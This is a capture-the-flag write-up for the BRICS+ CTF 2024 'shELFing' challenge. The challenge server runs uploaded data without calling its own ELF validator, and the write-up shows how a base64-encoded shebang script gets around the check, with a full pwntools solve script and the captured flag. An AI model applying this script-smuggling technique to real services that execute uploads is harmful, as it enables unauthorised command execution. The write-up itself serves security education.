# shELFing
## Challenge
**Category:** Pwn
**Difficulty:** Entry-Level  
**Source:** BRICS+ CTF 2024
We were presented with a challenge titled "shELFing" with the following description:
> Let's play a game?
> Just send a valid x64 ELF executable binary.  
> But, one rule: size matters!
Additionally, we were provided with a server script (`server.py`) that handles incoming connections and processes the user input.
## Analysis
The provided `server.py` script performs the following steps:
1. **Receives Input:** It prompts the user to enter a base64-encoded ELF x64 executable.
2. **Decodes Input:** It decodes the input from base64.
3. **Checks Size:** It ensures the decoded data does not exceed a maximum size (`MAX_USER_INPUT = 76` bytes).
4. **Writes to File:** It appends four null bytes to the data and writes it to a temporary file in `/tmp/`.
5. **Sets Permissions:** It changes the file permissions to make it executable.
6. **Executes File:** It executes the file using `os.execve`.
Notably, the script includes a `checkElf` function intended to validate that the input is a proper ELF file, but **this function is never called**.
```python
#!/usr/bin/env python3
import sys
import os
import base64
MAX_USER_INPUT = 76
def checkElf(data: bytes) -> bool:
    if data[0:4] != b'\x7fELF':
        return False
    if data[0x12] != 0x3e:
        return False
    if data[0x10] != 0x2:
        return False
    return True
def main():
    elf_data = input("[?] Enter base64 encoded ELF x64 executable: ")
    try:
        elf_data = base64.b64decode(elf_data)
    except:
        print("[-] Can't decode base64!")
        sys.exit(0)
    
    if len(elf_data) > MAX_USER_INPUT:
        print("[-] Error ELF size!")
        sys.exit(0)
    
    elf_data += b'\x00' * 4
    filename = "/tmp/{}".format(os.urandom(16).hex())
    fd = open(filename, 'wb')
    fd.write(elf_data)
    fd.close()
    os.chmod(filename, 0o755)
    os.execve(filename, [filename], {})
if __name__ == "__main__":
    main()
```
### Key Observations
- **Size Limitation:** The executable must be **76 bytes or less** after base64 decoding.
- **No ELF Validation:** Despite having a `checkElf` function, the server does not enforce ELF validation.
- **Execution of Arbitrary Files:** The server executes any file written to `/tmp/`, provided it doesn't exceed the size limit.
## Theory
Understanding how the server processes the input allows us to exploit its behavior:
- **Shebang Scripts:** In Unix-like systems, if an executable file starts with a shebang (`#!`), the kernel uses the specified interpreter to execute the script.
- **Script Execution:** Since the server doesn't validate the file type, we can send a script instead of a binary executable.
- **Command Execution:** By crafting a script that executes commands on the server, we can attempt to read the flag.
## Solution
### Attempted Solutions
1. **Sending a Minimal ELF Binary:**
   - Tried creating an ELF x64 binary under 76 bytes.
   - Found that even the smallest ELF binaries exceed the size limit when including meaningful functionality.
2. **Analyzing the `checkElf` Function:**
   - Noted that `checkElf` is not called.
   - Realized the server doesn't enforce the file to be an ELF binary.
3. **Sending a Shell Script:**
   - Decided to send a shell script starting with `#!/bin/sh`.
   - Crafted a script to read and output the contents of `flag.txt`.
### Final Solution
Send the shell script:
```bash
#!/bin/sh
cat flag.txt
```
Steps:
1. **Prepare the Script:**
   - Wrote the script to read the `flag.txt` file.
2. **Encode in Base64:**
   - Encoded the script in base64 to comply with the server's input format.
3. **Send to Server:**
   - Used `pwntools` to connect to the server.
   - Sent the base64-encoded script when prompted.
4. **Receive the Flag:**
   - Captured the server's response, which included the contents of `flag.txt`.
## How to Avoid
To prevent such vulnerabilities:
- **Input Validation:** Always validate and sanitize user inputs rigorously.
  - Call the `checkElf` function to ensure the file is a legitimate ELF binary.
## Full Solution
Here is the complete script used to solve the challenge:
```python
import base64
from pwn import *
# Content of the script
script = '#!/bin/sh\ncat flag.txt\n'
# Convert the script to bytes
script_bytes = script.encode('utf-8')
# Encode in base64
encoded_script = base64.b64encode(script_bytes)
# Print the encoded script
print(encoded_script.decode())
# Establish remote connection using pwntools
ip = '127.0.0.1'
port = 18181
#ip = '89.169.156.185'
#port = 10418
# Create a remote connection
conn = remote(ip, port)
# Send the base64-encoded script
conn.sendline(encoded_script)
data = b''
while True:
    try:
        line = conn.recvline(timeout=2)  # Receive line by line
        data += line
    except EOFError:  # No more data to receive
        break
print(data.decode())
```
**Output:**
```shell
-$ nc 127.0.0.1 18181
[?] Enter base64 encoded ELF x64 executable: IyEvYmluL3NoCmNhdCBmbGFnLnR4dAo=
brics+{16189ec8-6b4a-444f-83fa-1c4a89cfbe79}
```
